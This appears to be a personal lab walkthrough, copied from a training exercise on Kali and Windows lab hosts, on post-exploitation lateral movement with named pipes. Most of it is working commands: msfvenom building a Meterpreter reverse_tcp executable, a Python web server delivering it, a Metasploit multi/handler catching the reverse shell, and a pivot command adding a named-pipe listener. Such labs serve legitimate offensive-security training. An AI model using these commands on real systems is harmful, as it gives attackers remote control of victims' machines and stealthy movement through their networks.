Cheat Sheet for MSFVENOM-- 

.. loading ...


1.  Lateral movement with Named Pipes

Lateral movement is performed after exploiting a system. You, as the attacker, then look at the possibility of finding other systems or devices that can be exploited. After you have found vulnerabilities on other hosts, you can move from the existing host to the new hosts. The attackers typically target the remote services that can be exploited for lateral movement. In the command line, you can use services, such as telnet, rlogin, and SSH. In the GUI environment, depending on the type of platforms, such as Windows or Apple, you can use Remote Desktop Protocol (RDP), VNC, or Apple Remote Desktop (ARD).

You can also perform lateral movement using a named pipe.

A named pipe is a method that is used by two applications or programs to communicate with each other. The named pipe communication is encapsulated within the SMB protocol. After you gain access to a system within a network, the named pipes can be used for lateral movement in a stealthy manner.

In this task, you will learn to perform the lateral movement with named pipes. To do this, perform the following steps:
In this exercise, you will learn about exploiting discovered vulnerabilities.

''
1. You will first create a Meterpreter agent using Msfvenom. You can th   en use Metasploit to use named pipes for controlling agents.

> Type the following command:

$ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.3 lport=443 -f exe > shell.exe

> Press Enter

2. Next, you need to ensure that this file is available to the target system. You can start the SimpleHTTPServer, which will make the file available. To do this, type the following command:

> python -m SimpleHTTPServer 8000

> press enter

3. Now you need to create a Metasploit handler to accept the connection back to your system. To do this, you need to open the Metasploit Frame work.

''

 Minimize the terminal window and on the desktop, double click the meta sploit framework icon.

''

4. You will now use the multi-handler exploit. To do this, type the fol   lowing command:

> use exploit/multi/handler

> Press Enter

5. Set the reverse_tcp as the payload. To do this, type the following c   ommand:

> set PAYLOAD windows/meterpreter/reverse_tcp

> press enter

6. Now set the local host for reverse_tcp. To do this, type the following command:

> set LHOST 192.168.0.3

> press enter

7. Set the port on which you will accept the connections. To do this, type the following command:

> set LPORT 443

> press enter

8. you can set if the listener should close on the exit of the session.   
Type the following command:

> set ExitOnSession false

> press enter


8. now the exploit. Type the following command:

> exploit -j -z

> Press Enter.

9. The reverse_tcp handler has now started.


================ SWITCH ===================
> You should be leaving the kali box and connecting to PLABWIN810.

1. Click the Internet Explorer icon on the taskbar.

> The internet Explorer window is displayed. In the address bar, type t  he following command:


> http://192.168.0.3:8000

> press enter

> Notice that the shell.exe is listed in the file listing. Click shell.  exe.

2. In the notification bar, click Run. 

> you are back on the file listing.

 ============= SWITCH ==================

 you should be leaving PLABWIN810 for PLABKALI01

=========================================

... loading .. 


 with the start of the reverse_tcp session showing:

1. press enter and type the following command.

> sessions

> press enter

> notice that a session is established with the target system.

2. youu need to now switch to session 1. To do this, type the following command:

> sessions -i 1  ////(thats a one. not sure if ive been up too long or                  if my eyes are turely going bad. if my next entry is a                 bit "bumpy" and only legible without gloves on. then..                 we might be in trouble.)
> press enter

> The meterpreter command is displayed.

> Press Ctrl + l to clear the screen.



3. You need to create a pipe listener now. Type the following command:
   pivot add -t pipe -l 192.168.0.3 -n bgpipe -a x86 -p windows

> Press Enter

4. now you can list the active pipe listeners by typing:

> pivot list

> press enter

> notice that there is one active pipe listener.

